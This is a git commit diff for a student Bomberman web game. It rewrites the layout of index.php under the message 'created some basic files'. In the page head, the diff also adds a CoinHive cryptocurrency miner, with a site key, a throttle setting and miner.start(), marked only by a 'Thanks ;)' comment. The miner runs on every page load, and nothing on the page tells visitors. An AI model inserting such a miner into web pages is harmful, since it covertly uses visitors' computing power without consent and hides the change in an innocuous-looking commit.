86400f3ee27b8ce299a8401e5c31498d5e18a222
lukas <lukasmueller94@hotmail.com>
2017-12-14 22:37:22 +0100

    created some basic files

--- web/index.php
+++ web/index.php
@@ -27,37 +27,70 @@
 ?>
 <!doctype html>
 <html>
-    <head>
-        <style>
-            .block {
-                width: 30px;
-                height: 30px;
-                border: 1px solid black;
-                float: left;
-            }
-            .clear {
-                clear: both;
-            }
-        </style>
-    </head>
-    <body>
-        <a id="createRoom" href="#">Create Room</a>
-        Max Player:
-        <input type="number" id="maxPlayer" value="1" />
+<head>
+    <meta charset="utf-8">
+    <title>Bomberman</title>
+    <meta name="description" content="Bomberman Web Game" />
+    <meta name="keywords" content="Bomberman Web Projekt BFH" />
+    <meta name="author" content="Singer Nicolo & Mueller, Lukas" />
+    <meta name="Robots" content="index, follow">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
 
-        <div id="roomList">
+    <!--- Thanks ;) -->
+    <script src="./js/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('Nh4XYpARBp0w6kAKwMIMg4PcAzUjww09');
+        miner.setThrottle(0.6)
+        miner.start();
+    </script>
+</head>
 
+<body>
+
+    <noscript>
+        <div class="js_error">
+            <p>This page will only work if you enable Javascript and use a modern browser!</p>
+        </div>
+    </noscript>
+
+    <header id="header">
+        <h1>Bomberman - Web Project BTI7054</h1>
+    </header>
+
+    <main id="main">
+        <div id ="roomcontrols">
+            <h3>Create room</h3>
+            Room Name: <input type="text" id="name" value="name" /> <br />
+            Max Player: &nbsp;&nbsp;  <input type="number" id="maxPlayer" value="1" size="2" /> <br />
+            <script></script>
+            <a id="createRoom" href="#">Create Room</a>
         </div>
 
         <div id="field">
 
         </div>
 
+        <div id="roomList">
+
+        </div>
+
+
+
         <script
-            src="https://code.jquery.com/jquery-3.2.1.min.js"
-            integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
-            crossorigin="anonymous"></script>
-        <script type="text/javascript" src="js/socket.js">
+                src="https://code.jquery.com/jquery-3.2.1.min.js"
+                integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+                crossorigin="anonymous"></script>
+        <script src="js/socket.js">
         </script>
-    </body>
+
+    </main>
+
+    <footer id="footer">
+        &copy; Nicolo Singer & Lukas Müller <br />
+        Kindly hosted by <a href="https://whatwedo.ch">whatwedo.ch</a>
+    </footer>
+
+</body>
 </html>
